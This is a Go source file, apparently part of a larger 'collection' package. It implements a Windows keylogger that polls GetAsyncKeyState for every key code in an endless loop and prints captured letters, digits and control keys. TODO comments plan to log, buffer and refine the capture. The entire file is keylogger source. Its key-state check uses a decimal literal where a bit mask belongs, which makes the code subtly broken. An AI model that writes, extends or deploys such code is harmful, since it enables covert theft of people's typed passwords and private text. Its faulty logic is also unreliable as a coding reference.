package collection

import (
	"fmt"
	"syscall"
	"time"
)

var (
	user32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
	capsLock             = false
)

// KeyLogger logs keystrokes via the AsyncKeyState method
func KeyLogger() {
	time.Sleep(1 * time.Second)
	fmt.Println("Starting")
	for {

		// ToDO:
		// is shift down?
		// is caps down?
		// add other characters (periods, dashses, etc.)
		// Send keystrokes to log file
		// save keystrokes in a buffer
		// stop keylogger function
		for KEY := 0; KEY < 255; KEY++ {
			val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
			testBit := int(val) & 10000000
			if testBit != 0 {
				time.Sleep(80 * time.Millisecond)
				switch KEY {
				case 0x08:
					fmt.Print("\b") // backspace
				case 0x09:
					fmt.Print("[TAB]") // tab
				case 0x0D:
					fmt.Printf("\n") // newline

				// numbers
				case 0x30:
					fmt.Print(0)
				case 0x31:
					fmt.Print(1)
				case 0x32:
					fmt.Print(2)
				case 0x33:
					fmt.Print(3)
				case 0x34:
					fmt.Print(4)
				case 0x35:
					fmt.Print(5)
				case 0x36:
					fmt.Print(6)
				case 0x37:
					fmt.Print(7)
				case 0x38:
					fmt.Print(8)
				case 0x39:
					fmt.Print(9)

				// letters
				case 0x41:
					fmt.Print("A")
				case 0x42:
					fmt.Print("B")
				case 0x43:
					fmt.Print("C")
				case 0x44:
					fmt.Print("D")
				case 0x45:
					fmt.Print("E")
				case 0x46:
					fmt.Print("F")
				case 0x47:
					fmt.Print("G")
				case 0x48:
					fmt.Print("H")
				case 0x49:
					fmt.Print("I")
				case 0x4A:
					fmt.Print("J")
				case 0x4B:
					fmt.Print("K")
				case 0x4C:
					fmt.Print("L")
				case 0x4D:
					fmt.Print("M")
				case 0x4E:
					fmt.Print("N")
				case 0x4F:
					fmt.Print("O")
				case 0x50:
					fmt.Print("P")
				case 0x51:
					fmt.Print("Q")
				case 0x52:
					fmt.Print("R")
				case 0x53:
					fmt.Print("S")
				case 0x54:
					fmt.Print("T")
				case 0x55:
					fmt.Print("U")
				case 0x56:
					fmt.Print("V")
				case 0x57:
					fmt.Print("W")
				case 0x58:
					fmt.Print("X")
				case 0x59:
					fmt.Print("Y")
				case 0x5A:
					fmt.Print("Z")
					// 0x41 - 0x5A
				}

				//fmt.Println(KEY)
			}
		}
	}
}
